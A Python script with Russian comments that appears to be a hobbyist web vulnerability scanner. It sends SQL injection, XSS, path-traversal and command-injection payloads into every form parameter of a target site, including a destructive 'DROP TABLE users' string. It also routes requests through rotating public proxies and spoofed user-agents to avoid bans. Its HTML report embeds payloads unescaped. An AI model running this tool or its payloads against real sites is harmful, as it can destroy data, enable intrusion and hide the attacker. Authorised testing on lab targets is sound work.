import random
import requests
import urllib.parse
import time
import json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import argparse

# ========== КОНФИГ (ДОЛЖЕН БЫТЬ В САМОМ НАЧАЛЕ) ==========
CONFIG = {
    "timeout": 5,
    # ============================================================
    # Выбирай значение в зависимости от сценария:
    #
    #   Сценарий:                    | Рекомендуемая задержка:
    #   ----------------------------|----------------------
    #   Локальный тест (DVWA)       | 0.05 – 0.1
    #   Реальный сайт (с разреш.)   | 0.3 – 0.5
    #   Агрессивный пентест         | 0.1 – 0.3 можно если есть разрешение и договоренность
    #   Обход защиты (с прокси)     | 0.5 – 1.0
    #
    #   Чем меньше задержка — тем быстрее, но выше риск бана.
    #   Для локальных тестов можно ставить минимальные значения.
    # ============================================================
    "delay": 0.3,
    "threads": 10,
    "output_json": "vuln_report.json",
    "output_html": "vuln_report.html",
    "max_forms": 10,
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    ],
    "proxies": [
        "http://28.140.82.50:8443",
        "http://8.219.97.248:80"
    ],
    "cookies": {}
}

# ========== НАСТРОЙКА СЕССИИ ==========
session = requests.Session()

# Проверяем, есть ли куки в конфиге
if CONFIG.get("cookies"):
    session.cookies.update(CONFIG["cookies"])   # <--- теперь ошибки нет

# Устанавливаем случайный User-Agent
session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})

# Настройка повторных попыток при сбоях
retries = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
session.mount('http://', HTTPAdapter(max_retries=retries))
session.mount('https://', HTTPAdapter(max_retries=retries))
#  БАЗА УЯЗВИМОСТЕЙ (можно добавить свои)
VULN_DB = {
    "SQLi": {
         "payloads": [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'); DROP TABLE users--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' UNION SELECT @@version--",
        "' AND ASCII(SUBSTRING((SELECT user()),1,1))>0--"
    ],
        "error_signs": ["sql", "syntax", "mysql", "warning", "error", "unclosed", "mysql_fetch"]
    },
    "XSS": {
        "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)"
    ],
        "error_signs": ["<script>", "alert", "onerror", "svg/onload"]
    },
    "LFI": {
        "payloads": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2fetc%2fpasswd"
        ],
        "error_signs": ["root:", "boot.ini", "[extensions]", "etc/passwd", "win.ini"]
    },
    "RCE": {
        "payloads": [
            "; ls",
            "| whoami",
            "& dir",
            "`id`"
        ],
        "error_signs": ["uid=", "root", "Administrator", "usr/bin", "windows"]
    }
}

#Ниже идет чет типо цветного логирования

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def log_info(msg):
    print(f"{Colors.CYAN}[*] {msg}{Colors.RESET}")

def log_success(msg):
    print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")

def log_warning(msg):
    print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")

def log_error(msg):
    print(f"{Colors.RED}[-] {msg}{Colors.RESET}")

def log_vuln(msg):
    print(f"{Colors.RED}{Colors.BOLD}[VULN] {msg}{Colors.RESET}")


def extract_forms_and_params(url):
    """Парсит HTML, находит все формы и ссылки с параметрами"""
    try:
        response = requests.get(url, timeout=CONFIG["timeout"],
                                headers={"User-Agent":CONFIG["user_agents"][0]})
        soup = BeautifulSoup(response.text, "html.parser")
    except:
        log_error(f"Не удалось загрузить {url}")
        return {}

    params = {}


    #дальше уже ищем формы


    forms = soup.find_all("form")
    for form in forms [:CONFIG["max_forms"]]:
        action = form.get("action")
        method = form.get("method","get").lower()
        if action:

            form_url = urllib.parse.urljoin(url,action)
            inputs = form.find_all("input")
            param_names = [inp.get("name") for inp in inputs if inp.get("name")]
            if param_names:
                params[f"FORM_{method}_{form_url}"] = {"url":form_url,"method": method,"params":param_names}



    log_info(f"Найдено {len(params)} потенциальных параметров для сканирования")
    return params





# Тестирование одного параметра

def test_parameter(url, param, method, payload):
    try:
        # Случайно выбираем прокси из списка
        proxy = random.choice(CONFIG["proxies"]) if CONFIG["proxies"] else None
        proxies = {"http": proxy, "https": proxy} if proxy else None

        # Обновляем User-Agent случайным образом для каждого запроса
        session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})

        if method == "get":
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = session.get(test_url, timeout=CONFIG["timeout"], proxies=proxies)
            return response.text, test_url
        else:  # POST
            data = {param: payload}
            response = session.post(url, data=data, timeout=CONFIG["timeout"], proxies=proxies)
            return response.text, url
    except Exception as e:
        log_error(f"Ошибка при запросе: {e}")
        return None, url


def check_vulnerability(response_text, vuln_type):
    """Анализирует ответ на признаки уязвимости"""
    if not response_text:
        return False
    text_lower = response_text.lower()
    for sign in VULN_DB[vuln_type]["error_signs"]:
        if sign in text_lower:
            return True
    return False


def scan_single_param(url, param, method):
    results = []
    for vuln_type, vuln_data in VULN_DB.items():
        for payload in vuln_data["payloads"]:
            log_info(f"Проверяю {vuln_type} на {param} -> {payload[:15]}...")
            response_text, test_url = test_parameter(url, param, method, payload)
            if response_text is None:
                log_warning(f"Нет ответа для {param} с payload {payload[:10]}...")
                continue
            if check_vulnerability(response_text, vuln_type):
                log_vuln(f"Найдена {vuln_type} в параметре {param}!")
                results.append({
                    "url": test_url,
                    "param": param,
                    "vuln_type": vuln_type,
                    "payload": payload,
                    "method": method
                })
            time.sleep(CONFIG["delay"])
    return results

 #ну шо теперь самое для меня противное писать отчеты в штмл и джейсон вот тут очень стараюсь

def save_json(data, filename):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def save_html(data, filename):
    html = f"""
     <html>
     <head><meta charset="UTF-8"><title>Отчёт сканера уязвимостей</title></head>
     <body>
         <h1>Отчёт о найденных уязвимостях</h1>
         <table border="1">
             <tr><th>URL</th><th>Параметр</th><th>Тип</th><th>Payload</th><th>Метод</th></tr>
     """
    for item in data:
        html += f"""
             <tr>
                 <td>{item['url']}</td>
                 <td>{item['param']}</td>
                 <td>{item['vuln_type']}</td>
                 <td>{item['payload']}</td>
                 <td>{item['method']}</td>
             </tr>
         """
    html += "</table></body></html>"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html)


#УРААААААААА основная функция

def main():
    print("=" * 70)
    print(Colors.BOLD + "   СКАНЕР УЯЗВИМОСТЕЙ 3.0 (SQLi, XSS, LFI, RCE)" + Colors.RESET)
    print("=" * 70)
    if CONFIG["proxies"]:
        print("[*] Проверка прокси...")
        for proxy in CONFIG["proxies"]:
            try:
                test = requests.get("http://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=5)
                print(f"[+] {proxy} работает. Ваш IP через прокси: {test.text}")
            except:
                print(f"[-] {proxy} не отвечает. Пропускаем.")
    target_url = input("Введите базовый URL (например, http://testphp.vulnweb.com): ").strip()
    if not target_url.startswith("http"):
        target_url = "http://" + target_url

    log_info("Извлекаю параметры и формы с главной страницы...")
    params_dict = extract_forms_and_params(target_url)


    if not params_dict:
        log_error("Не найдено параметров для сканирования.")
        return


    all_results = []
    with ThreadPoolExecutor(max_workers=CONFIG["threads"]) as executor:
        futures = []
        for key, info in params_dict.items():
            for param in info["params"]:
                futures.append(executor.submit(
                    scan_single_param, info["url"], param, info["method"]))
        for future in futures:
            results = future.result()
            all_results.extend(results)


    #Выводим итоги

    print("\n" + "="*70)
    if all_results:
        log_success(f"Всего найдено уязвимостей:{len(all_results)}")
        for res in all_results:
            log_vuln(f"{res['vuln_type']}|{res['url']}|param={res['param']}|payload={res['payload']}")
            save_json(all_results, CONFIG["output_json"])
            save_html(all_results, CONFIG["output_html"])
            log_success(f"Отчёты сохранены:{CONFIG['output_json']},{CONFIG['output_html']}")
    else:
        log_info("Уязвимостей не обнаружено")


if __name__ == "__main__":
    main()


